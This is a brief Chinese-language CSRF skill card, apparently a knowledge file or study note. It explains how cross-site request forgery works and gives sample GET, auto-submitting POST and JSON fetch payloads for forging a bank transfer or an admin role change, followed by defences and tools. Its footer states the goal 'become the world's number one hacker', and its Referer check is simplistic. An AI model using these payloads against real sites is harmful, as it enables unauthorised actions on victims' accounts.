# CSRF (跨站请求伪造) Skill

## 简介
CSRF是一种Web安全漏洞，攻击者诱导受害者执行非本意的操作。

## 漏洞原理

### 1. 工作机制
```
1. 受害者登录网站A
2. 攻击者诱导访问恶意页面
3. 恶意页面发起对A的请求
4. 浏览器携带Cookie发送请求
5. 网站A执行操作
```

### 2. 攻击条件
- 用户已登录
- 无二次验证
- 请求可预测

## 攻击方式

### 1. GET型
```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### 2. POST型
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

### 3. JSON型
```javascript
fetch('http://api.com/update', {
  method: 'POST',
  body: JSON.stringify({role: 'admin'})
})
```

## 防御措施

### 1. CSRF Token
```python
# 服务器生成
token = generate_csrf_token()
# 验证
if not verify_csrf_token(token):
    abort(403)
```

### 2. SameSite Cookie
```
Set-Cookie: session=xxx; SameSite=Strict
Set-Cookie: session=xxx; SameSite=Lax
```

### 3. 双重提交
- Cookie中存储Token
- 请求中携带Token

### 4. 验证Referer
```python
if not request.referer.startswith('https://mysite.com'):
    abort(403)
```

### 5. 二次验证
- 密码确认
- 验证码

## 工具

- Burp Suite CSRF Tester
- CSRFF
- OWASP ZAP

---
*目标: 成为世界第一黑客*
*类型: Web安全*
